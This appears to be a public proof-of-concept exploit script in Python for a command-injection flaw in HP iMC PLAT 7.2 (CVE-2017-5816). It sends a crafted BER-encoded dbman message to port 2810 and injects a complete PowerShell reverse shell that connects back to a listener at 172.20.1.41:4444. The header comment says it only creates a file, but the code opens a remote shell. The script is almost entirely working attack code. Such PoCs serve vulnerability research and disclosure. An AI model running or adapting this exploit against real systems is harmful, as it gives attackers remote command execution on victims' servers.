#!/usr/bin/env python3

# Exploit Title: HP iMC Plat 7.2 dbman Opcode 10008 Command Injection RCE
# Date: 11-29-2017
# Exploit Author: Chris Lyne (@lynerc)
# Vendor Homepage: www.hpe.com
# Software Link: https://h10145.www1.hpe.com/Downloads/DownloadSoftware.aspx?SoftwareReleaseUId=16759&ProductNumber=JG747AAE&lang=en&cc=us&prodSeriesId=4176535&SaidNumber=
# Version: iMC PLAT v7.2 (E0403) Standard
# Tested on: Windows Server 2008 R2 Enterprise 64-bit
# CVE : CVE-2017-5816
# See Also: http://www.zerodayinitiative.com/advisories/ZDI-17-340/

# note that this PoC will create a file 'C:\10008.txt'

from pyasn1.type.univ import *
from pyasn1.type.namedtype import *
from pyasn1.codec.ber import encoder
import struct
import socket

ip = '172.30.0.103'
port = 2810
payload="$LHOST = \"172.20.1.41\"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"
opcode = 10008


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))

class DbmanMsg(Sequence):
    componentType = NamedTypes(
        NamedType('dbIp', OctetString()),
        NamedType('iDBType', Integer()),
        NamedType('dbInstance', OctetString()),
        NamedType('dbSaUserName', OctetString()),
        NamedType('dbSaPassword', OctetString()),
        NamedType('strOraDbIns', OctetString())
    )

msg = DbmanMsg()

msg['dbIp'] = OctetString(ip.encode())
msg['iDBType'] = Integer(4)
msg['dbInstance'] = OctetString(f'a" & {payload} & "'.encode())
msg['dbSaUserName'] = OctetString(b"b")
msg['dbSaPassword'] = OctetString(b"c")
msg['strOraDbIns'] = OctetString(b"d")

encodedMsg = encoder.encode(msg, defMode=True)
msgLen = len(encodedMsg)
values = (opcode, msgLen, encodedMsg)
s = struct.Struct(f">ii{msgLen}s")
packed_data = s.pack(*values)

sock.send(packed_data)
sock.close()
